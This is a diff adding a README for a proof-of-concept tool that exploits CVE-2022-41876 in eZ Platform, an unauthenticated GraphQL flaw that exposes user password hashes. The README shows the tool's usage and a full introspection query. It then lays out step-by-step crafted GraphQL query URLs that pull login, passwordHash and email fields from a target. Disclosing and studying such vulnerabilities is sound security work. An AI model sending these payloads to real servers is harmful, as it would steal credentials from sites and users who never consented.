@@ -1,0 +1,81 @@
+<div align="center">
+  <img alt="ibexa logo" width="600" src="./logo/Ibexa_Logo.png">
+  <br><br>
+  <img alt="Python3.9" src="https://img.shields.io/badge/Python-3.9+-informational">
+  <img alt="current version" src="https://img.shields.io/badge/linux-supported-success"><br>
+  <a href="https://twitter.com/intent/follow?screen_name=Skilo" title="Follow"><img src="https://img.shields.io/twitter/follow/askilow?label=Skilo&style=social" alt="Twitter Skilo"></a>
+  <a href="https://twitter.com/intent/follow?screen_name=TahiTi" title="Follow"><img src="https://img.shields.io/twitter/follow/0xTahiTi?label=TahiTi&style=social" alt="Twitter TahiTi"></a>
+  <br><br>
+</div>
+
+# CVE-2022-41876 - eZ Platform user information disclosure
+
+A vulnerability emerged in eZ Platform letting an unauthenticated user access every contributor password's hash.
+This PoC enumerates every possible GraphQL path leading to a 'User' object, and then requests these paths to retrieve users' confidential information.
+
+## Usage
+
+```
+python3 cve-2022-41876.py -h
+```
+```
+usage: cve-2022-41876.py [-h] [-t] [-f FILE] url
+
+CVE-2022-41876 POC
+
+positional arguments:
+  url                   Target URL (specify the graphql endpoint)
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t, --thread          Number of threads
+  -f FILE, --file FILE  Local path to introspect file
+```
+
+## Results
+
+![image](./example/poc.gif)
+
+## How it works ?
+
+The different steps followed by this tool to exploit the CVE are:
+
+### Retrieving introspect file
+
+The first step to exploit this CVE is to get an introspect.json file.
+One way to retrieve it is to query the graphql endpoint of the server with the following payload:
+
+```
+https://<your-url>/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name%20description%20locations%20args{...InputValue}}}}fragment%20FullType%20on%20__Type{kind%20name%20description%20fields(includeDeprecated:true){name%20description%20args{...InputValue}type{...TypeRef}isDeprecated%20deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name%20description%20isDeprecated%20deprecationReason}possibleTypes{...TypeRef}}fragment%20InputValue%20on%20__InputValue{name%20description%20type{...TypeRef}defaultValue}fragment%20TypeRef%20on%20__Type{kind%20name%20ofType{kind%20name%20ofType{kind%20name%20ofType{kind%20name%20ofType{kind%20name%20ofType{kind%20name%20ofType{kind%20name%20ofType{kind%20name}}}}}}}}
+```
+
+### Finding paths to User objects
+
+Then the json given by the server can be used to extract all paths to the 'User' objects with the tool [graphql-enum-path](https://gitlab.com/dee-see/graphql-path-enum) like this:
+
+![image](./example/graphql-enum.png)
+
+### Requesting found paths to get users' data
+
+Finally, once all the paths are found, a specific payload must be crafted this way and sent to the server:
+```
+https://<your-url>/graphql?query={element1{element2{element3{...{id,name,login,passwordHash,email,enabled,maxLogin}}}}}
+```
+Where elements correspond to the texts between bracket in the result of graphql-enum-path _(note that a query must be done for each path)_.
+
+So, with the graphql-enum-path example above, the first payload would be:
+```
+https://<your-url>/graphql?query={_repository{location{contentInfo{contentType{creator{id,name,login,passwordHash,email,enabled,maxLogin}}}}}}
+```
+
+If the server is vulnerable to this CVE, it will respond to that query with a json file containing its users' data.
+
+## References
+
+[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
+
+[graphql-enum-path](https://gitlab.com/dee-see/graphql-path-enum)
+
+## Credits
+
+This PoC was created by [@Skilo](https://github.com/Skileau) and [@TahiTi](https://github.com/TahiTi)
